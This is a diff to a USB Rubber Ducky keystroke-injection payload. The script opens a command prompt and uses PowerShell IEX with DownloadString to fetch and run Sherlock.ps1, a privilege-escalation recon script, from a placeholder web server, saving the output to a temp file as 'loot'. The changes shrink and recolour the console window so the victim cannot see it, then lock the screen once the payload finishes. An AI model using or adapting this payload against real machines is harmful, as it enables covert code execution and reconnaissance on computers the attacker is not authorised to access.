@@ -10,7 +10,13 @@ DELAY 500
 STRING cmd
 DELAY 50
 ENTER
-DELAY 1000
+REM *Obfuscate the command prompt*
+STRING mode con:cols=18 lines=1
+DELAY 50
+ENTER
+STRING color FE
+DELAY 50
+ENTER
 REM *Run Sherlock.ps1 and send output to C:\Windows\Temp\sherlock.txt*
 STRING echo IEX(New-Object Net.WebClient).DownloadString('http://yourserver.here/Sherlock.ps1') | powershell -noprofile - > C:\Windows\Temp\sherlock.txt
 DELAY 50
@@ -69,4 +75,7 @@ DELAY 50
 ENTER
 DELAY 6000
 ALT F4
+DELAY 100
+REM *Lock the screen so you know the payload is finished*
+GUI l
 REM *Go check your webserver for your loot!*
